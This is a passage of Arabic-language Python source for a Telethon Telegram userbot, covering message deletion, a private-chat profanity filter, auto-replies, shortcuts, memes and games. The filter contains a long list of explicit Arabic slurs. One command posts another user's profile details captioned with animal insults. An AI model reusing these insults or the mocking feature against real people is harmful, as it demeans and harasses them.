@client.on(events.NewMessage(pattern=r"\.نوع$", outgoing=True))
async def show_time_formats(event):
    formats_text = "\n".join(time_formats)
    await event.respond(f"🚀 قائمة أنواع اليوزرات المتاحة للصيد 🚀:\n\n{formats_text}")
    await event.delete()

@client.on(events.NewMessage(pattern=r'^مسح (\d+)$'))
async def delete_messages(event):
    count = int(event.pattern_match.group(1))  # استخراج العدد المطلوب مسحه
    chat = event.chat_id  # الحصول على معرف الدردشة

    async for message in client.iter_messages(chat, limit=count):
        await message.delete()

    await event.edit(f'تم مسح {count} رسالة بنجاح!', delete_after=5)  # تأكيد العملية ثم حذف الرسالة بعد 5 ثوانٍ

@client.on(events.NewMessage(pattern=r'^مسح رسائلي$'))
async def delete_my_messages(event):
    chat = event.chat_id
    user_id = event.sender_id  # الحصول على معرف المستخدم الذي أرسل الأمر   
    async for message in client.iter_messages(chat, from_user=user_id):
        await message.delete()

    await event.edit('تم مسح جميع رسائلك!', delete_after=5)  # تأكيد العملية ثم حذف الرسالة بعد 5 ثوانٍ
    

# ✅ تحميل بيانات الحماية من ملف JSON
try:
    with open("private_protection.json", "r") as f:
        protection_data = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    protection_data = {
        "enabled": True,
        "banned_words": [
            "كسمك", "انيك امك", "قحبة", "شرموطة", "زبي", "متناك", "خول", "عاهرة", 
            "زب", "عرص", "قواد", "حيوان", "زبالة", "ملعون", "تف عليك", "كحبة", "كلب",
            "يلعن شكلك", "يا ابن الكلب", "ابن المتناكه", "ابن الوسخة", "تفو عليك", 
            "يلعن دينك", "عرص ابن عرص", "متناك ابن المتناك", "قحب", "زناخة", "وسخ", 
            "منيك", "بنت القحبة", "ابن الشرموطة", "خنزير", "قذارة", "نتن", "نجس", 
            "عديم الشرف", "عبيط", "غبي", "حمار", "بغل", "قليل الأدب", "سافل", 
            "وسخ ابن وسخة", "حثالة", "وضيع", "ملعون الوالدين", "ابن الزنا", "ديوث", 
            "الكلب ابن الكلب", "المنايك", "ابن العاهرة", "قليل الحياء", "سافل منحط",
            "فاسق", "كافر", "خنيث", "واطي", "منحط", "حثالة المجتمع", "حقير", "تيس", 
            "تافه", "ما عندك رجولة", "مسخرة", "وضيع", "زفت", "معفن", "انجس الناس", 
            "اخس البشر", "انت ولا شي", "خنزير قذر", "ملعون أبوك", "انعل ابو شكلك"
        ],
        "warnings": {}  # لحفظ التحذيرات لكل مستخدم
    }

def save_protection_data():
    """حفظ بيانات الحماية إلى ملف JSON."""
    with open("private_protection.json", "w") as f:
        json.dump(protection_data, f, indent=4)

# ✅ تفعيل أو تعطيل الحماية
@client.on(events.NewMessage(pattern=r"^.حماية الخاص$"))
async def toggle_protection(event):
    protection_data["enabled"] = not protection_data["enabled"]
    save_protection_data()
    status = "**⎙ مفعلة**" if protection_data["enabled"] else "**⎙ معطلة**"
    await event.edit(f"**⎙ تم تغيير وضع حماية الخاص إلى:** {status}")

# ✅ حذف الكلمات المسيئة وإرسال تحذيرات ثم الحظر بعد 3 تحذيرات
@client.on(events.NewMessage)
async def delete_bad_words(event):
    if not protection_data["enabled"]:  # إذا كانت الحماية معطلة، لا تفعل شيء
        return

    if event.is_private and event.text:  # التأكد من أن الرسالة في الخاص وتحتوي على نص
        user_id = str(event.sender_id)
        text_lower = event.text.lower()  # تحويل النص إلى حروف صغيرة

        for word in protection_data["banned_words"]:
            # استخدام regex للتحقق من وجود الكلمة ككلمة مستقلة
            if re.search(rf"\b{re.escape(word)}\b", text_lower):
                try:
                    await event.delete()  # حذف الرسالة
                except Exception as e:
                    print(f"خطأ أثناء حذف الرسالة: {e}")

                # **إدارة التحذيرات**
                protection_data["warnings"][user_id] = protection_data["warnings"].get(user_id, 0) + 1
                save_protection_data()

                warnings_count = protection_data["warnings"][user_id]

                if warnings_count >= 3:
                    try:
                        await event.respond("**⎙ تم حظرك بسبب استخدامك كلمات غير لائقة!**")
                        await client(functions.contacts.BlockRequest(event.sender_id))
                    except Exception as e:
                        print(f"خطأ أثناء الحظر: {e}")

                    del protection_data["warnings"][user_id]  # مسح التحذيرات بعد الحظر
                    save_protection_data()
                else:
                    remaining_warnings = 3 - warnings_count
                    await event.respond(f"⎙ تحذير {warnings_count}/3 ⚠️\n"
                                        f"⎙ لا تغلط لانك راح تنهان {remaining_warnings} تحذير{'ات' if remaining_warnings > 1 else ''}!")

                break  # التوقف عند العثور على كلمة محظورة
                              
# تحميل البيانات المخزنة
data_file = "responses.json"

def load_data():
    """تحميل البيانات من ملف JSON مع التحقق من سلامة البيانات."""
    if not os.path.exists(data_file) or os.stat(data_file).st_size == 0:
        return {"responses": {}, "enabled_groups": []}

    try:
        with open(data_file, "r", encoding="utf-8") as f:
            data = json.load(f)
            if isinstance(data, dict):
                return {
                    "responses": data.get("responses", {}),
                    "enabled_groups": set(data.get("enabled_groups", [])),
                }
    except (json.JSONDecodeError, FileNotFoundError):
        pass  # في حالة حدوث خطأ، نعيد القيم الافتراضية

    return {"responses": {}, "enabled_groups": set()}

def save_data():
    """حفظ البيانات إلى ملف JSON."""
    with open(data_file, "w", encoding="utf-8") as f:
        json.dump({"responses": responses, "enabled_groups": list(enabled_groups)}, f, ensure_ascii=False, indent=4)

# تحميل الردود والمجموعات المفعلة
data = load_data()
responses = data["responses"]
enabled_groups = data["enabled_groups"]

@client.on(events.NewMessage(pattern=r".اضف رد \+ (.+) \+ (.+)"))
async def add_response(event):
    """إضافة رد جديد"""
    _, key, value = event.raw_text.split(" + ", 2)
    responses[key] = value
    save_data()
    await event.edit(f"⎙ تم **إضافة الرد** بنجاح:\n**{key} → {value}**")

@client.on(events.NewMessage(pattern=r".الردود"))
async def list_responses(event):
    """عرض جميع الردود المخزنة"""
    if responses:
        msg = "**⎙ الردود المخزنة:**\n\n" + "\n".join([f"⎙ **{k}** → {v}" for k, v in responses.items()])
    else:
        msg = "⎙ لا توجد ردود مخزنة."
    
    await event.reply(msg)  # تغيير event.edit إلى event.reply

@client.on(events.NewMessage(pattern=r".تفعيل هنا"))
async def enable_group(event):
    """تفعيل الردود التلقائية في المجموعة"""
    chat_id = event.chat_id
    enabled_groups.add(chat_id)
    save_data()
    await event.edit("**⎙ تم تفعيل الردود التلقائية في هذه المجموعة.**")

@client.on(events.NewMessage(pattern=r".تعطيل هنا"))
async def disable_group(event):
    """تعطيل الردود التلقائية في المجموعة"""
    chat_id = event.chat_id
    if chat_id in enabled_groups:
        enabled_groups.remove(chat_id)
        save_data()
        await event.edit("**⎙ تم تعطيل الردود التلقائية في هذه المجموعة.**")
    else:
        await event.edit("**⎙ الردود التلقائية غير مفعلة هنا.**")

@client.on(events.NewMessage)
async def auto_reply(event):
    """الرد التلقائي عند تطابق الرسالة في المجموعات المفعلة"""
    if event.chat_id in enabled_groups:
        text = event.raw_text.strip()
        if text in responses:
            await event.reply(responses[text])
         
# تحميل البيانات من ملف JSON
try:
    with open("warnings.json", "r") as f:
        data = json.load(f)
except (FileNotFoundError, json.JSONDecodeError):
    data = {
        "warnings": {},
        "whitelist": [],
        "max_warnings": 5,
        "warning_message": "⎙ تحذير {warnings}/{max_warnings}\n⎙ يرجى عدم الإزعاج وإلا سيتم حظرك تلقائيًا!"
    }

def save_data():
    """حفظ البيانات إلى ملف JSON."""
    with open("warnings.json", "w") as f:
        json.dump(data, f, indent=4)

@client.on(events.NewMessage(incoming=True))
async def handle_private_messages(event):
    """تحذير فقط من يراسلني في الخاص وعدم تحذير نفسي."""
    if event.is_group or event.is_channel:
        return  # تجاهل الرسائل من المجموعات والقنوات

    sender = await event.get_sender()
    user_id = sender.id

    # تجاهل رسائلي الشخصية (أنا صاحب الحساب)
    if user_id == (await client.get_me()).id:
        return

    # التحقق من القائمة البيضاء
    if user_id in data["whitelist"] or sender.bot:
        return

    # إضافة تحذير للمستخدم
    warnings = data["warnings"].get(str(user_id), 0) + 1
    data["warnings"][str(user_id)] = warnings
    save_data()

    max_warnings = data["max_warnings"]

    if warnings >= max_warnings:
        await event.respond(f"**⎙ تم حظرك بسبب تجاوز الحد المسموح به من التحذيرات ({max_warnings})!**")
        await client(BlockRequest(user_id))  # تنفيذ الحظر الفعلي
    else:
        warning_message = data["warning_message"].format(warnings=warnings, max_warnings=max_warnings)
        await event.reply(warning_message)

@client.on(events.NewMessage(pattern=r"^.قبول$"))
async def accept_user(event):
    """إضافة المستخدم إلى القائمة البيضاء عند الرد على رسالته."""
    if event.is_group or event.is_channel:
        return  

    reply = await event.get_reply_message()
    if not reply:
        await event.edit("**⎙ يجب الرد على رسالة المستخدم لقبوله.**")
        return

    sender = await reply.get_sender()
    user_id = sender.id

    if user_id not in data["whitelist"]:
        data["whitelist"].append(user_id)
        save_data()

    await event.edit("**⎙ تم قبول المستخدم، لن يتلقى تحذيرات بعد الآن.**")

@client.on(events.NewMessage(pattern=r"^.الغاء القبول$"))
async def remove_acceptance(event):
    """إزالة المستخدم من القائمة البيضاء عند الرد على رسالته."""
    if event.is_group or event.is_channel:
        return  

    reply = await event.get_reply_message()
    if not reply:
        await event.edit("**⎙ يجب الرد على رسالة المستخدم لإلغاء قبوله.**")
        return

    sender = await reply.get_sender()
    user_id = sender.id

    if user_id in data["whitelist"]:
        data["whitelist"].remove(user_id)
        save_data()

    await event.edit("**⎙ تم إلغاء قبول المستخدم، سيتلقى تحذيرات عند المراسلة.**")

@client.on(events.NewMessage(pattern=r"^.مسح التحذيرات$"))
async def clear_warnings(event):
    """مسح جميع تحذيرات المستخدم عند الرد على رسالته."""
    if event.is_group or event.is_channel:
        return  

    reply = await event.get_reply_message()
    if not reply:
        await event.edit("**⎙ يجب الرد على رسالة المستخدم لمسح تحذيراته.**")
        return

    sender = await reply.get_sender()
    user_id = sender.id

    if str(user_id) in data["warnings"]:
        del data["warnings"][str(user_id)]
        save_data()

    await event.edit("**⎙ تم مسح جميع تحذيرات المستخدم.**")

@client.on(events.NewMessage(pattern=r"^.التحذيرات$"))
async def show_warnings(event):
    """عرض عدد تحذيرات المستخدم عند طلب ذلك."""
    if event.is_group or event.is_channel:
        return  

    sender = await event.get_sender()
    user_id = sender.id

    warnings = data["warnings"].get(str(user_id), 0)
    max_warnings = data["max_warnings"]
    await event.edit(f"**⎙ لديك {warnings} من {max_warnings} تحذيرات.**")

@client.on(events.NewMessage(pattern=r"^.تعيين كليشة التحذير$"))
async def change_warning_message(event):
    """تغيير كليشة التحذير عبر الرد على رسالة."""
    reply = await event.get_reply_message()
    if not reply:
        await event.edit("**⎙ يجب الرد على رسالة تحتوي على الكليشة الجديدة.**")
        return

    new_message = reply.text
    data["warning_message"] = new_message
    save_data()
    await event.edit("**⎙ تم تغيير كليشة التحذير بنجاح!**")

@client.on(events.NewMessage(pattern=r"^.عرض كليشة$"))
async def show_warning_message(event):
    """عرض رسالة التحذير الحالية."""
    if event.is_group or event.is_channel:
        return  

    await event.edit(f"**⎙ رسالة التحذير الحالية:\n\n{data['warning_message']}**")

@client.on(events.NewMessage(pattern=r"^.عدد التحذيرات(\d+)$"))
async def change_max_warnings(event):
    """تعديل الحد الأقصى للتحذيرات قبل الحظر."""
    if event.is_group or event.is_channel:
        return  

    try:
        new_limit = int(event.pattern_match.group(1))
        if new_limit <= 0:
            await event.edit("**⎙ الحد الأقصى للتحذيرات يجب أن يكون عددًا أكبر من صفر.**")
            return
    except ValueError:
        await event.edit("**⎙ يجب إدخال عدد صحيح للحد الأقصى للتحذيرات.**")
        return

    data["max_warnings"] = new_limit
    save_data()

    await event.edit(f"**⎙ تم تعديل الحد الأقصى للتحذيرات إلى {new_limit}.**")

@client.on(events.NewMessage(pattern=r"^.المحظورين$"))
async def show_banned_users(event):
    """عرض قائمة المحظورين بسبب التحذيرات."""
    if event.is_group or event.is_channel:
        return  

    banned_users = [user_id for user_id, count in data["warnings"].items() if count >= data["max_warnings"]]
    if not banned_users:
        await event.edit("**⎙ لا يوجد مستخدمون محظورون حاليًا.**")
    else:
        banned_list = "\n".join(f"🔹 {user_id}" for user_id in banned_users)
        await event.edit(f"⎙ قائمة المحظورين:\n{banned_list}")

@client.on(events.NewMessage(pattern=r"^.مسح المحظورين$"))
async def clear_banned_users(event):
    """مسح قائمة المحظورين."""
    if event.is_group or event.is_channel:
        return  

    data["warnings"] = {user_id: count for user_id, count in data["warnings"].items() if count < data["max_warnings"]}
    save_data()

    await event.edit("**⎙ تم مسح جميع المحظورين.**")

@client.on(events.NewMessage(pattern=r"^.تفعيل التحذير$"))
async def enable_warnings(event):
    """تفعيل نظام التحذيرات."""
    if event.is_group or event.is_channel:
        return  

    data["warnings_enabled"] = True
    save_data()
    await event.edit("**⎙ تم تفعيل نظام التحذيرات.**")

@client.on(events.NewMessage(pattern=r"^.تعطيل التحذير$"))
async def disable_warnings(event):
    """تعطيل نظام التحذيرات."""
    if event.is_group or event.is_channel:
        return  

    data["warnings_enabled"] = False
    save_data()
    await event.edit("**⎙ تم تعطيل نظام التحذيرات.**")

# قاموس لتخزين الاختصارات
shortcuts = {}

# ✅ إضافة اختصار (بالرد على رسالة)
@client.on(events.NewMessage(pattern=r"^.اختصار \+ (\S+)$"))
async def add_shortcut(event):
    key = event.pattern_match.group(1)

    # التحقق من وجود رسالة يتم الرد عليها
    if event.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        shortcuts[key] = reply_message.text
        await event.edit(f"**⎙ تم حفظ الاختصار ({key}) ⇨ {reply_message.text}**")
    else:
        await event.edit("**⎙ يجب الرد على رسالة لاختصارها.**")

# 🔄 استرجاع الاختصار والرد به
@client.on(events.NewMessage)
async def get_shortcut(event):
    text = event.raw_text.strip()
    if text in shortcuts:
        await event.reply(shortcuts[text], reply_to=event.id)  # يرد على الرسالة

# 🗑️ حذف اختصار
@client.on(events.NewMessage(pattern=r"^.حذف اختصار \+ (\S+)$"))
async def delete_shortcut(event):
    key = event.pattern_match.group(1)
    if key in shortcuts:
        del shortcuts[key]
        await event.edit(f"**⎙ تم حذف الاختصار ({key})**")
    else:
        await event.edit(f"**⎙ لا يوجد اختصار بهذا الاسم ({key})**")

# 📌 عرض جميع الاختصارات
@client.on(events.NewMessage(pattern=r"^.الاختصارات$"))
async def list_shortcuts(event):
    if shortcuts:
        text = "\n".join([f"{k} ⇨ {v}" for k, v in shortcuts.items()])
        await event.edit(f"**⎙ قائمة الاختصارات:\n{text}**")
    else:
        await event.edit("**⎙ لا توجد اختصارات محفوظة.**")
        
# قاعدة بيانات مؤقتة لتخزين البصمات
MEMES_DB = {}

# إضافة بصمة جديدة
@client.on(events.NewMessage(pattern=r"^\.ميمز (\S+) (.+)"))
async def add_meme(event):
    key = event.pattern_match.group(1)  # اسم البصمة
    url = event.pattern_match.group(2)  # رابط التليجرام
    
    # تخزين الرابط في قاعدة البيانات
    MEMES_DB[key] = url
    
    await event.edit(f"**᯽︙ تم إضافة البصمة '{key}' بنجاح ✓**")

# استرجاع البصمة وإرسالها كملف صوتي
@client.on(events.NewMessage(pattern=r"^\?(\S+)"))
async def get_meme(event):
    key = event.pattern_match.group(1)  # اسم البصمة
    
    if key in MEMES_DB:
        url = MEMES_DB[key]

        # تحميل الملف الصوتي من الرابط باستخدام Telethon
        file_path = await download_telegram_audio(event.client, url)
        
        if file_path:
            await event.client.send_file(event.chat_id, file_path, voice_note=True)
            os.remove(file_path)  # حذف الملف بعد الإرسال
        else:
            await event.reply("**❌ فشل في تحميل البصمة الصوتية!**")
    else:
        await event.reply(f"**❌ لم يتم العثور على بصمة بهذا الاسم '{key}'**")

# عرض قائمة البصمات المخزنة
@client.on(events.NewMessage(pattern=r"^قائمة الميمز$"))
async def list_memes(event):
    if MEMES_DB:
        message = "**᯽︙ قائمة تخزين أوامر الميمز:**\n"
        for key in MEMES_DB:
            message += f"- البصمة: `{key}`\n"
    else:
        message = "**᯽︙ لا توجد بصمات ميمز مخزنة حتى الآن**"
    
    await event.edit(message)

# حذف بصمة محددة
@client.on(events.NewMessage(pattern=r"^ازالة(?:\s|$)([\s\S]*)"))
async def delete_meme(event):
    key = event.pattern_match.group(1)
    
    if key in MEMES_DB:
        del MEMES_DB[key]
        await event.edit(f"**᯽︙ تم حذف البصمة '{key}' بنجاح ✓**")
    else:
        await event.edit(f"**❌ لم يتم العثور على بصمة بهذا الاسم '{key}'**")

# حذف جميع البصمات
@client.on(events.NewMessage(pattern=r"^ازالة_البصمات$"))
async def delete_all_memes(event):
    MEMES_DB.clear()
    await event.edit("**᯽︙ تم حذف جميع بصمات الميمز من القائمة ✓**")

# وظيفة لتحميل البصمة الصوتية من رابط تيليجرام
async def download_telegram_audio(client, url):
    try:
        # استخدام Telethon لتحميل الملف الصوتي
        message = await client.get_messages(url, limit=1)
        if message and message.media:
            file_path = await client.download_media(message.media, file="voice_note.ogg")
            return file_path
        else:
            return None
    except Exception as e:
        print(f"خطأ في تحميل البصمة الصوتية: {e}")
        return None

# دالة لإنشاء اسم مع رابط قابل للنقر
def get_clickable_name(user):
    name = user.first_name
    if user.username:
        return f"[{name}](https://t.me/{user.username})"
    return f"[{name}](tg://user?id={user.id})"

# أوامر النسبة (.نسبة و .نسبتنا)
@client.on(events.NewMessage(pattern=r"\.(نسبة|نسبتنا) (.+)"))
async def percentage(event):
    word = event.pattern_match.group(2)
    percentage = random.randint(1, 100)

    if event.is_reply:
        user = await event.get_reply_message()
        target_name = get_clickable_name(user.sender)
    else:
        target_name = get_clickable_name(event.sender)

    await event.edit(f"**⎙ {word} لدى {target_name}: {percentage}%**", parse_mode="md")

# أوامر الترفيه (.بوسة | .هينة)
@client.on(events.NewMessage(pattern=r"\.(بوسة|هينة)"))
async def kiss(event):
    actions = ["هاك بوسه", "بوسة خفيفة", "بوسة على الجبين", "بوسة مع حضن"]
    
    if event.is_reply:
        user = await event.get_reply_message()
        target_name = get_clickable_name(user.sender)
    else:
        target_name = get_clickable_name(event.sender)

    await event.edit(f"{target_name}, {random.choice(actions)}", parse_mode="md")

# أوامر رفع + أي كلمة
user_titles = {}  # تخزين الألقاب

@client.on(events.NewMessage(pattern=r"\رفع (.+)"))
async def promote(event):
    title = event.pattern_match.group(1)

    if event.is_reply:
        user = await event.get_reply_message()
        user_id = user.sender_id
        user_name = get_clickable_name(user.sender)
    else:
        user_id = event.sender_id
        user_name = get_clickable_name(event.sender)

    if user_id not in user_titles:
        user_titles[user_id] = []

    if title in user_titles[user_id]:
        return await event.edit(f"**⎙ هذا مرفوع {title} من اول**", parse_mode="md")

    user_titles[user_id].append(title)
    await event.edit(f"**⎙ تم رفع {user_name} إلى {title}**", parse_mode="md")

# أمر الزواج (.زواج)
@client.on(events.NewMessage(pattern=r"\.زواج"))
async def marriage(event):
    responses = ["💍 ألف مبروك الزواج!", "تم الزواج رسميًا!", "الزواج مرفوض!", "أجمل ثنائي!"]
    await event.reply(random.choice(responses))

# أمر المقارنة (.مقارنة)
@client.on(events.NewMessage(pattern=r"\.مقارنة"))
async def compare(event):
    percentage = random.randint(1, 100)
    await event.edit(f"**نسية المقارنه {percentage}% بينكما**")

# أمر القتل (.اقتله)
@client.on(events.NewMessage(pattern=r"\.اقتله"))
async def kill(event):
    methods = ["تم الطعن حتى الموت", "انفجر في الهواء", "أُطلق عليه النار", "سقط من مبنى شاهق"]

    if event.is_reply:
        user = await event.get_reply_message()
        target_name = get_clickable_name(user.sender)
    else:
        target_name = get_clickable_name(event.sender)

    await event.edit(f"{target_name} {random.choice(methods)}", parse_mode="md")

# أيدي الشخص الذي تريد الرد عليه
target_user_id = 7915484613  # ضع هنا أيدي الشخص الذي تريد الرد عليه

last_reply_times = {}  # تخزين آخر وقت رد لكل مستخدم

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def handler(event):
    global last_reply_times
    sender_id = event.sender_id
    current_time = time.time()

    # تحقق من أن المرسل هو الشخص الذي تم تحديد أيده
    if sender_id == target_user_id:
        # الرد مرة كل ساعتين (7200 ثانية)
        if sender_id not in last_reply_times or current_time - last_reply_times[sender_id] > 7200:
            await event.reply("هلا مطوري")
            last_reply_times[sender_id] = current_time  # تحديث وقت آخر رد

plugin_category = "العروض"
LOGS = logging.getLogger(__name__)

sts_animal_list = [
    "https://telegra.ph/file/720a8d292301289bb7ca4.mp4",  # مطي
    "https://telegra.ph/file/fa43723297d16ebccfa94.mp4",  # كلب
    "https://telegra.ph/file/bc4c35ca805ab9e4ef8d7.mp4",  # قرد
    "https://telegra.ph/file/7cc42816b3e161f7183b6.mp4",  # صخل
    "https://telegra.ph/file/8beaf555e0d4e3f00c294.mp4",  # طلي
    "https://telegra.ph/file/c34cb870037a4ed2be972.mp4",  # بزون
    "https://telegra.ph/file/c499feb6a51dea16a1fe5.mp4",  # ابو بريص
    "https://telegra.ph/file/19b193f06d680e3ec79c0.mp4",  # جريذي
    "https://telegra.ph/file/cd1fcb86af78d83ba9002.mp4",  # هايشه
]

jjj = [
    "100% مو حيوان غنبله 😱😂.",
    "90% مو حيوان ضيم 😱😂👆",
    "80%  ٴ😱😂",
    "70%  ٴ😱😂",
    "60% براسه 60 حظ 👌😂",
    "50% حيوان هجين👍😂",
    "( 40% ) خوش حيوان 👌😂",
    "30% ٴ😒😂",
    "20% ٴ😒😂",
    "10% ٴ😒😂",
    "0% ٴ😢😂",
]


async def get_user_from_event(event):
    if event.reply_to_msg_id:
        previous_message = await event.get_reply_message()
        return await event.client.get_entity(previous_message.sender_id)
    else:
        user = event.pattern_match.group(1)
        if user.isnumeric():
            user = int(user)
        if not user:
            self_user = await event.client.get_me()
            user = self_user.id
        if event.message.entities:
            probable_user_mention_entity = event.message.entities[0]
            if isinstance(probable_user_mention_entity, MessageEntityMentionName):
                return await event.client.get_entity(probable_user_mention_entity.user_id)
        if isinstance(user, int) or user.startswith("@"):
            return await event.client.get_entity(user)
        try:
            return await event.client.get_entity(user)
        except (TypeError, ValueError) as err:
            await event.edit(str(err))
            return None


async def fetch_info(replied_user, event):
    full_user = (await event.client(GetFullUserRequest(replied_user.id))).full_user
    replied_user_profile_photos = await event.client(
        GetUserPhotosRequest(user_id=replied_user.id, offset=42, max_id=0, limit=80)
    )
    replied_user_profile_photos_count = "الحيوان مامخلي بروفايل"
    try:
        replied_user_profile_photos_count = replied_user_profile_photos.count
    except AttributeError:
        pass

    user_id = replied_user.id
    first_name = replied_user.first_name or "غير معروف"
    last_name = replied_user.last_name or ""
    username = f"@{replied_user.username}" if replied_user.username else "لا يوجد معرف"
    yoy = random.choice(jjj)
    x = random.randint(0, len(sts_animal_list) - 1)

    animal_types = [
        "مطي زربه 🦓", "جلب شوارع 🐕‍🦺", "قرد لزكـه 🐒", "صخل محترم 🐐",
        "طلي ابو البعرور الوصخ 🐑", "بزون ابوخالد 🐈", "الزاحف ابو بريص 🦎",
        "جريذي ابو المجاري 🐀", "هايشه 🐄"
    ]

    caption = (
        f"<b>  ╮•🦦 الحيوان ⇦ </b> {first_name} {last_name} \n"
        f"<b> ٴ╼──────────────────╾ </b>\n"
        f"<b> • ⎙ | معـرفه  ⇦ </b> {username}\n"
        f"<b> • ⎙ | ايـديه   ⇦ </b> <code>{user_id}</code>\n"
        f"<b> • ⎙ | صـوره  ⇦ </b> {replied_user_profile_photos_count} </b>\n"
        f"<b> • ⎙ | نــوعه   ⇦  {animal_types[x]} </b>\n"
        f"<b> • ⎙ | نسبتـه  ⇦  {yoy} </b>\n\n\n"
    )

    return sts_animal_list[x], caption

@client.on(events.NewMessage(pattern=r"^حيوان(?: |$)(.*)"))
async def who(event):
    zed = await event.edit("⇆")  # تعديل أولي للرسالة
    zel_dev = {7915484613}
    special_users = {7915484613}

    if not os.path.isdir("downloads"):
        os.makedirs("downloads")

    replied_user = await get_user_from_event(event)
    if not replied_user:
        return await event.edit("**- لـم استطـع العثــور على الشخص**")

    if replied_user.id in zel_dev:
        return await event.edit("**- دي . . إنهُ أحد المطورين . . انتَ الحيوان ولك**")

    if replied_user.id in special_users:
        return await event.edit("**- دي . . إنهُ المطور . . انتَ الحيوان ولك**")

    try:
        ZEED_IMG, caption = await fetch_info(replied_user, event)
    except AttributeError:
        return await event.edit("**- لـم استطـع العثــور على الشخص**")

    message_id_to_reply = event.message.reply_to_msg_id or None

    try:
        if ZEED_IMG:  # التحقق من وجود الصورة قبل الإرسال
            await event.client.send_file(
                event.chat_id,
                ZEED_IMG,
                caption=caption,
                link_preview=False,
                reply_to=message_id_to_reply,
                parse_mode="html",
            )
            await zed.delete()
        else:
            await event.edit(caption, parse_mode="html")
    except Exception as e:
        await event.edit(f"**- حدث خطأ:** {str(e)}")

DART_E_MOJI = "🎯"
DICE_E_MOJI = "🎲"
BALL_E_MOJI = "🏀"
FOOT_E_MOJI = "⚽️"
SLOT_E_MOJI = "🎰"

async def roll_dice(event, emoticon, max_value):
    reply_message = event
    if event.reply_to_msg_id:
        reply_message = await event.get_reply_message()
    
    input_str = event.pattern_match.group(2)
    await event.delete()
    
    r = await reply_message.reply(file=InputMediaDice(emoticon=emoticon))
    
    if input_str:
        try:
            required_number = int(input_str)
            while True:
                # حذف الرسالة السابقة وإرسال أخرى حتى نصل للقيمة المطلوبة
                if r.media.value == required_number:
                    break
                await r.delete()
                r = await reply_message.reply(file=InputMediaDice(emoticon=emoticon))
        except Exception:
            pass
    else:
        if event.sender_id == (await event.client.get_me()).id:
            await event.edit(file=InputMediaDice(emoticon=emoticon))
        else:
            await event.reply(file=InputMediaDice(emoticon=emoticon))

# تأكد من تعريف هذه المتغيرات في مكان آخر
DART_E_MOJI = "🎯"
DICE_E_MOJI = "🎲"
BALL_E_MOJI = "🏀"
FOOT_E_MOJI = "⚽️"
SLOT_E_MOJI = "🎰"

@client.on(events.NewMessage(pattern=".اكس او$"))
async def gamex(event):
    botusername = "@xobot"
    noob = "play"
    tap = await client.inline_query(botusername, noob)
    await tap[0].click(event.chat_id)
    await event.delete()

@client.on(events.NewMessage(pattern=f"({DART_E_MOJI}|.سهم)( ([1-6])|$)"))
async def dart_game(event):
    emoticon = "🎯" if event.pattern_match.group(1) == ".سهم" else DART_E_MOJI
    await roll_dice(event, emoticon, 6)

@client.on(events.NewMessage(pattern=f"({DICE_E_MOJI}|.نرد)( ([1-6])|$)"))
async def dice_game(event):
    emoticon = "🎲" if event.pattern_match.group(1) == ".نرد" else DICE_E_MOJI
    await roll_dice(event, emoticon, 6)

@client.on(events.NewMessage(pattern=f"({BALL_E_MOJI}|.سله)( ([1-5])|$)"))
async def basketball_game(event):
    emoticon = "🏀" if event.pattern_match.group(1) == ".سله" else BALL_E_MOJI
    await roll_dice(event, emoticon, 5)

@client.on(events.NewMessage(pattern=f"({FOOT_E_MOJI}|.كرة)( ([1-5])|$)"))
async def football_game(event):
    emoticon = "⚽️" if event.pattern_match.group(1) == ".كرة" else FOOT_E_MOJI
    await roll_dice(event, emoticon, 5)

@client.on(events.NewMessage(pattern=f"({SLOT_E_MOJI}|.حظ)( ([1-64])|$)"))
async def slot_game(event):
    emoticon = "🎰" if event.pattern_match.group(1) == ".حظ" else SLOT_E_MOJI
    await roll_dice(event, emoticon, 64)

# دالة لإنشاء صورة imposter
async def amongus_gen(text: str, clr: int) -> str:
    url = "https://github.com/JoKeRUB-AR/l313l-Resources/raw/master/Resources/Amongus/"
    font = ImageFont.truetype(
        BytesIO(
            get(
                "https://github.com/JoKeRUB-AR/l313l-Resources/raw/master/Resources/fonts/bold.ttf"
            ).content
        ),
        60,
    )
    imposter = Image.open(BytesIO(get(f"{url}{clr}.png").content))
    text_ = "\n".join("\n".join(wrap(part, 30)) for part in text.split("\n"))
    w, h = ImageDraw.Draw(Image.new("RGB", (1, 1))).multiline_textsize(
        text_, font, stroke_width=2
    )
    text = Image.new("RGBA", (w + 30, h + 30))
    ImageDraw.Draw(text).multiline_text(
        (15, 15), text_, "#FFF", font, stroke_width=2, stroke_fill="#000"
    )
    w = imposter.width + text.width + 10
    h = max(imposter.height, text.height)
    image = Image.new("RGBA", (w, h))
    image.paste(imposter, (0, h - imposter.height), imposter)
    image.paste(text, (w - text.width, 0), text)
    image.thumbnail((512, 512))
    output = BytesIO()
    output.name = "imposter.webp"
    webp_file = os.path.join('TEMP_DIR', output.name)
    image.save(webp_file, "WebP")
    return webp_file

# إضافة الأوامر لكتابة الدالة للعمل مع الأوامر الخاصة بـ client
@client.on(events.NewMessage(pattern=r'من القاتل(|بريء) ([\s\S]*)'))
async def imposter_handler(event):
    name = event.pattern_match.group(2)
    cmd = event.pattern_match.group(1).lower()
    
    text1 = await event.reply("᯽︙ هممم اكيـد اكو شـخص مات !!")
    await asyncio.sleep(2)
    await text1.delete()
    
    if cmd == "بريء":
        await event.reply(f"**{name} لـم يـكن الـقاتل.**")
    else:
        await event.reply(f"**{name} لقـد كـان الـقاتل.**")

# إضافة أمر للحصول على صورة Imposter
@client.on(events.NewMessage(pattern=r'القاتل(|بريء) ([\s\S]*)'))
async def text_animation_handler(event):
    name = event.pattern_match.group(2)
    cmd = event.pattern_match.group(1).lower()

    catevent = await event.reply(f"{name} تـم اخـراجـه.......")
    await asyncio.sleep(2)
    await catevent.edit("ඞㅤㅤㅤㅤ ㅤㅤㅤㅤ")
    await asyncio.sleep(0.8)

    if cmd == "":
        await catevent.edit(f"{name} لقـد كـان الـقاتل.")
    elif cmd == "بريء":
        await catevent.edit(f"{name} لـم يـكن الـقاتل.")
        
# اشهر مزغرفة
@client.on(events.NewMessage(pattern=r"^.اشهر مزغرفة$"))
async def اشهر_مزغرفة(event):
    await event.edit(
        "**✦ اشهر مزخرفة ✦**\n\n"
        "✦ الأشهر الميلادية ✦\n"
        "- 𝑱𝒂𝒏𝒖𝒂𝒓𝒚 ✿\n"
        "- 𝑭𝒆𝒃𝒓𝒖𝒂𝒓𝒚 ❥\n"
        "- 𝑴𝒂𝒓𝒄𝒉 ♛\n"
